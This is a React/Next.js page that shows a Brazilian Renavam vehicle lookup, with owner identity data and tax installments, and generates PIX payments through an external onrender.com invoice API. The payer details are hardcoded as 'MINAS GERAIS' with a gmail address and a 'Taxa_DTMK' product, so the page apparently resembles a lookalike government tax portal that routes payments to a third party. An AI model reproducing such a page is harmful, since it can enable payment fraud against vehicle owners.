"use client";

import React, { useState, useEffect } from "react";
import { useRenavam } from "../../contexts/RenavamContext";
import {
  Typography,
  Box,
  Card,
  CardContent,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Checkbox,
  Badge,
  Grid,
  Button,
  CircularProgress,
} from "@mui/material";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import { useRouter } from "next/navigation";
import {
  AttachMoney,
  CalendarToday,
  DirectionsCar,
  LocationOn,
  LocationCity,
  Business,
  ConfirmationNumber,
  PersonOutline,
  LocationOnOutlined,
  AssignmentIndOutlined,
  MapOutlined,
  DirectionsCarOutlined,
  ThirteenMpOutlined,
  MoneyOutlined,
  PinOutlined,
  DvrOutlined,
} from "@mui/icons-material";

import styles from "./page.module.scss";
import GerarPagamento from "@/components/GerarPix/page";
import axios from "axios";
import PagamentoConfirmado from "@/components/PagamentoConfirmado/Page";

// Função para formatar valores monetários
const formatCurrency = (value) => {
  return new Intl.NumberFormat("pt-BR", {
    style: "currency",
    currency: "BRL",
  }).format(value);
};

const ResultadoRenavam = () => {
  const { data } = useRenavam();

  // Adicionando o estado para gerenciar os checkboxes e o valor total
  const [valorTotal, setValorTotal] = useState(0);
  const [parcelasSelecionadas, setParcelasSelecionadas] = useState([]);
  const [accordionExpanded, setAccordionExpanded] = useState({});
  const [codPix, setCodPix] = useState("");
  const [invoiceIdOriginal, setInvoiceIdOriginal] = useState("");
  const [loading, setLoading] = useState(false);
  const [statusPag, setStatusPag] = useState(false); // Estado para o status do pagamento

  const router = useRouter();

  const iniciarPolling = (invoiceId) => {
    if (!invoiceId) return; // Não inicia o polling se o ID da fatura não existir

    // Declarar o identificador do intervalo fora da função
    let interval;

    const verificarStatusPagamento = async () => {
      try {
        const response = await axios.get(
          `https://passport-api-urnz.onrender.com/invoice-details/${invoiceId}`
        );

        const statusTitle = response?.data?.invoices[0]?.status?.title;

        console.log(statusTitle);
        if (statusTitle === "Pagamento Confirmado!") {
          setStatusPag(true); // Atualiza o estado para true
          clearInterval(interval); // Interrompe o polling imediatamente
          console.log("Pagamento confirmado. Polling interrompido.");
        }
      } catch (error) {
        console.error("Erro ao verificar o status do pagamento:", error);
      }
    };

    // Configura o polling para verificar o status a cada 5 segundos
    interval = setInterval(verificarStatusPagamento, 5000);

    // Certifica-se de limpar o polling quando o componente for desmontado
    return () => {
      clearInterval(interval);
      console.log("Polling interrompido devido à desmontagem do componente.");
    };
  };

  useEffect(() => {
    if (codPix) {
      const stopPolling = iniciarPolling(invoiceIdOriginal);
      return stopPolling; // Certifique-se de interromper o polling ao desmontar
    }
  }, [codPix]);

  // Função para atualizar o valor total das parcelas selecionadas
  const handleCheckboxChange = (parcela, valorTotalParcela) => {
    if (parcela.estaPago) return; // Não permite selecionar parcelas já pagas

    // Atualiza o valor total
    if (parcela.selecionado) {
      setValorTotal(valorTotal - valorTotalParcela);
    } else {
      setValorTotal(valorTotal + valorTotalParcela);
    }

    // Inverte o estado da seleção da parcela
    parcela.selecionado = !parcela.selecionado;
  };

  // Função para formatar o valor total
  const formatarValorTotal = (valorTotal) => {
    return valorTotal.toFixed(2); // Mantém 2 casas decimais e remove o ponto
  };

  // Função para chamar a API
  const enviarDadosParaAPI = async (valorTotal) => {
    try {
      // Formata o valor total
      const valorTotalFormatado = formatarValorTotal(valorTotal);

      // Dados mockados para envio
      const payload = {
        costumerData: {
          name: "MINAS GERAIS",
          document: "18715615000160",
          email: "taxas@gmail.com",
          phone: "73982340745",
          address: {
            street: "Avenida do Contorno",
            number: "123",
            district: "Centro",
            city: "Belo Horizonte",
            state: "MG",
            zipcode: "30110013",
            country: "BRA",
          },
          ip: "192.168.1.1",
        },
        invoiceData: {
          client: {
            document: "18715615000160",
            email: "taxas@gmail.com",
            ip: "192.168.1.1",
          },
          payment: {
            type: "3",
            due_at: "2025-12-02",
            installment: "1",
            store_url: "https://google.com",
            order_url: "https://example.com/order/123",
            products: [
              {
                id: "1",
                title: "Taxa_DTMK",
                qnt: "1",
                amount: valorTotalFormatado, // Envia o valor formatado
              },
            ],
          },
        },
      };

      // Chamada à API
      const response = await axios.post(
        "https://passport-api-urnz.onrender.com/create-invoice",
        payload,
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      );

      // Sucesso
      console.log("Resposta da API:", response.data);
      return response.data;
    } catch (error) {
      // Erro
      console.error(
        "Erro ao enviar dados para a API:",
        error.response?.data || error.message
      );
      throw error;
    }
  };

  // Função para inicializar as parcelas e aplicar as regras de seleção
  useEffect(() => {
    if (!data) return;

    // Inicializando o estado do accordion, abrindo os não pagos
    const expandedState = data.extratoDebitos.reduce((acc, debito) => {
      acc[debito.anoExercicio] = debito.parcelas.some(
        (parcela) => !parcela.estaPago
      );
      return acc;
    }, {});

    setAccordionExpanded(expandedState);
  }, [data]);

  useEffect(() => {
    if (!data) {
      router.push("/");
    }
  }, [data, router]);

  if (!data) {
    return null; // Enquanto redireciona, não renderiza nada
  }

  return (
    <div className={styles.container}>
      {/* Header */}
      <Box sx={{ backgroundColor: "#b81f25", padding: 3 }}>
        <Grid container justifyContent="space-between" alignItems="center">
          <Grid item>
            <img src="/logowhite.png" alt="Logo" />
          </Grid>
          <Grid item>
            <Typography variant="body2" color="white">
              <b>Consulta realizada</b> em {data.dataHoraConsulta} - Resultado
              obtido para o Renavam: {data.renavam}
            </Typography>
          </Grid>
        </Grid>
      </Box>

      <Box sx={{ padding: 3 }}>
        <Card elevation={0}>
          <CardContent>
            <Typography
              variant="h6"
              sx={{ fontWeight: "bold", textAlign: "left", marginBottom: 2 }}
            >
              Dados do Veículo {statusPag ? "Pago" : "Não Pago"}
            </Typography>
            <Grid container spacing={3}>
              {/* Primeira Parte: Proprietário */}
              {!codPix && (
                <Grid item xs={12} sm={6}>
                  <Typography
                    variant="body1"
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      color: "#777",
                      marginBottom: 1,
                      fontSize: "0.9rem",
                    }}
                  >
                    <PersonOutline sx={{ marginRight: 1 }} />
                    <strong>Nome:</strong>&nbsp;{" "}
                    {data.proprietario.nome || "N/A"}
                  </Typography>
                  <Typography
                    variant="body1"
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      color: "#777",
                      marginBottom: 1,
                      fontSize: "0.9rem",
                    }}
                  >
                    <LocationOnOutlined sx={{ marginRight: 1 }} />
                    <strong>UF:</strong>&nbsp; {data.proprietario.uf || "N/A"}
                  </Typography>
                  <Typography
                    variant="body1"
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      color: "#777",
                      marginBottom: 1,
                      fontSize: "0.9rem",
                    }}
                  >
                    <AssignmentIndOutlined sx={{ marginRight: 1 }} />
                    <strong>CPF/CNPJ:</strong>&nbsp;
                    {data.proprietario.cpfCnpj || "N/A"}
                  </Typography>
                  <Typography
                    variant="body1"
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      color: "#777",
                      marginBottom: 1,
                      fontSize: "0.9rem",
                    }}
                  >
                    <MapOutlined sx={{ marginRight: 1 }} />
                    <strong>Município:</strong>&nbsp;
                    {data.proprietario.municipio || "N/A"}
                  </Typography>
                </Grid>
              )}

              {/* Segunda Parte: Veículo */}
              <Grid item xs={12} sm={6}>
                <Typography
                  variant="body1"
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    color: "#777",
                    marginBottom: 1,
                    fontSize: "0.9rem",
                  }}
                >
                  <DirectionsCarOutlined sx={{ marginRight: 1 }} />
                  <strong>Modelo:</strong>&nbsp;{" "}
                  {data.veiculo.marcaModelo || "N/A"}
                </Typography>
                <Typography
                  variant="body1"
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    color: "#777",
                    marginBottom: 1,
                    fontSize: "0.9rem",
                  }}
                >
                  <ThirteenMpOutlined sx={{ marginRight: 1 }} />
                  <strong>Placa:</strong>&nbsp; {data.veiculo.placa || "N/A"}
                </Typography>
                <Typography
                  variant="body1"
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    color: "#777",
                    marginBottom: 1,
                    fontSize: "0.9rem",
                  }}
                >
                  <DvrOutlined sx={{ marginRight: 1 }} />
                  <strong>Renavam:</strong>&nbsp; {data.renavam || "N/A"}
                </Typography>
                <Typography
                  variant="body1"
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    color: "#777",
                    marginBottom: 1,
                    fontSize: "0.9rem",
                  }}
                >
                  <PinOutlined sx={{ marginRight: 1 }} />
                  <strong>Chassi:</strong>&nbsp; {data.veiculo.chassi || "N/A"}
                </Typography>
              </Grid>
            </Grid>
          </CardContent>
        </Card>
      </Box>

      {statusPag ? (
        <Box sx={{ paddingLeft: 3, paddingRight: 3 }}>
          <PagamentoConfirmado data={data} />
        </Box>
      ) : codPix ? (
        <GerarPagamento codigoPix={codPix} />
      ) : (
        <Box sx={{ padding: 3 }}>
          <Card elevation={0}>
            <CardContent>
              <Typography
                variant="h6"
                sx={{ fontWeight: "bold", textAlign: "left", marginBottom: 2 }}
              >
                Detalhamento dos valores
              </Typography>

              {/* Mapeando os extratos de débitos por ano */}
              {data.extratoDebitos.map((debito, index) => (
                <Accordion
                  key={index}
                  sx={{
                    marginBottom: 2,
                    border: "1px solid #ddd", // Linha de borda, sem sombra
                    borderRadius: 2, // Bordas arredondadas
                  }}
                  expanded={accordionExpanded[debito.anoExercicio] || false}
                  onChange={() =>
                    setAccordionExpanded((prevState) => ({
                      ...prevState,
                      [debito.anoExercicio]: !prevState[debito.anoExercicio],
                    }))
                  }
                  elevation={0}
                >
                  <AccordionSummary
                    expandIcon={<ExpandMoreIcon />}
                    aria-controls={`panel${debito.anoExercicio}-content`}
                    id={`panel${debito.anoExercicio}-header`}
                    sx={{
                      padding: "10px 20px", // Padding mais suave
                      backgroundColor: "#fff", // Cor de fundo do cabeçalho
                      borderRadius: 2, // Bordas arredondadas
                      display: "flex",
                      alignItems: "center", // Alinha os itens no centro
                    }}
                  >
                    <Box sx={{ display: "flex", gap: 5, alignItems: "center" }}>
                      <Typography variant="h6" sx={{ fontWeight: "bold" }}>
                        {debito.anoExercicio}
                      </Typography>
                      <Badge
                        badgeContent={
                          debito.parcelas.some((parcela) => parcela.estaPago)
                            ? "Pago"
                            : "Aberto"
                        }
                        color={
                          debito.parcelas.some((parcela) => parcela.estaPago)
                            ? "success"
                            : "warning"
                        }
                      />
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails sx={{ padding: 2 }}>
                    {/* Mapeando as parcelas dentro de cada extrato de débito */}
                    {debito.parcelas.map((parcela, pIndex) => (
                      <Box
                        key={pIndex}
                        sx={{
                          padding: 2,
                          border: "1px solid #ddd",
                          borderRadius: 1,
                          marginBottom: 2,
                          backgroundColor: parcela.estaPago
                            ? "#e7f7e7"
                            : "#fff",
                          cursor: "pointer",
                          display: "flex",
                          flexDirection: "row",
                          alignItems: "center",
                          justifyContent: "space-between",
                        }}
                        onClick={() => {
                          handleCheckboxChange(
                            debito.parcelas[pIndex],
                            parcela.valorTotal
                          );
                        }}
                      >
                        <Grid container spacing={2} alignItems="center">
                          <Grid
                            item
                            xs={12}
                            sm={4}
                            sx={{ display: "flex", alignItems: "center" }}
                          >
                            <Checkbox
                              checked={
                                parcela.selecionado || parcela.estaPago || false
                              }
                              color="primary"
                              disabled={parcela.estaPago}
                              sx={
                                parcela.selecionado && {
                                  color: "#b81f25", // Cor do checkbox selecionado
                                  "&.Mui-checked": { color: "#b81f25" },
                                }
                              }
                            />
                            <Typography variant="body1" sx={{ marginLeft: 1 }}>
                              {parcela.descricao}
                            </Typography>
                          </Grid>

                          <Grid
                            item
                            xs={12}
                            sm={4}
                            sx={{
                              display: "flex",
                              justifyContent: "space-between",
                            }}
                          >
                            {/* A Vencer: Adiciona o ícone de calendário para débitos não pagos */}
                            {!parcela.estaPago && (
                              <Box
                                sx={{
                                  display: "flex",
                                  alignItems: "center",
                                  color: "#b81f25",
                                }}
                              >
                                <CalendarToday sx={{ marginRight: 1 }} />
                                <Typography
                                  variant="body2"
                                  sx={{ fontWeight: "bold" }}
                                >
                                  A Vencer
                                </Typography>
                              </Box>
                            )}
                          </Grid>

                          <Grid
                            item
                            xs={12}
                            sm={4}
                            sx={{ display: "flex", justifyContent: "flex-end" }}
                          >
                            <Box sx={{ display: "flex", alignItems: "center" }}>
                              <Grid
                                item
                                sx={{
                                  display: "flex",
                                  alignItems: "center",
                                  marginRight: 2,
                                }}
                              >
                                <CalendarToday sx={{ marginRight: 1 }} />
                                <Typography variant="body2">
                                  <strong>Vencimento:</strong>{" "}
                                  {parcela.dataVencimento}
                                </Typography>
                              </Grid>
                              <Grid
                                item
                                sx={{ display: "flex", alignItems: "center" }}
                              >
                                <AttachMoney sx={{ marginRight: 1 }} />
                                <Typography variant="body2">
                                  <strong>Valor:</strong>{" "}
                                  {formatCurrency(parcela.valorTotal)}
                                </Typography>
                              </Grid>
                            </Box>
                          </Grid>
                        </Grid>
                      </Box>
                    ))}
                  </AccordionDetails>
                </Accordion>
              ))}
            </CardContent>
          </Card>
        </Box>
      )}

      {!codPix && (
        <Box
          sx={{
            position: "fixed",
            bottom: 0,
            left: 0,
            right: 0,
            backgroundColor: "#f1f1f1",
            padding: 2,
            borderTop: "1px solid #ddd",
            textAlign: "center",
            zIndex: 2,
            display: "flex", // Flexbox para alinhamento
            justifyContent: "space-between", // Espaço entre os elementos
            alignItems: "center", // Alinha os itens verticalmente
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
            <Typography variant="body1" sx={{ fontSize: "1rem" }}>
              Total
            </Typography>

            {/* Valor total maior à direita */}
            <Typography
              variant="h6"
              sx={{ fontSize: "1.45rem", fontWeight: "600" }}
            >
              {formatCurrency(valorTotal)}
            </Typography>
          </Box>

          {/* Botão "Gerar Pagamento" à direita */}
          <Button
            variant="contained"
            color="primary"
            sx={{
              marginLeft: 2, // Espaço entre o valor e o botão
              padding: "8px 16px",
              fontSize: "1rem",
              textTransform: "capitalize",
            }}
            disabled={loading || valorTotal < 1}
            onClick={async () => {
              setLoading(true); // Ativa o carregamento
              try {
                // Chama a função para enviar os dados para a API
                const response = await enviarDadosParaAPI(valorTotal);

                // Atualiza o estado `codPix` com o valor retornado da API
                const codigoPix = response?.invoice?.fatura?.pix?.payload;
                const invoice = response?.invoice?.fatura?.id;

                if (codigoPix) {
                  setCodPix(codigoPix);
                  setInvoiceIdOriginal(invoice);
                } else {
                  console.error("Erro: código PIX não encontrado na resposta.");
                }
              } catch (error) {
                console.error("Erro ao gerar pagamento:", error.message);
              } finally {
                setLoading(false); // Desativa o carregamento ao final da operação
              }
            }}
          >
            {loading ? (
              <CircularProgress size={24} color="inherit" />
            ) : (
              "Gerar Pagamento"
            )}
          </Button>
        </Box>
      )}
    </div>
  );
};

export default ResultadoRenavam;
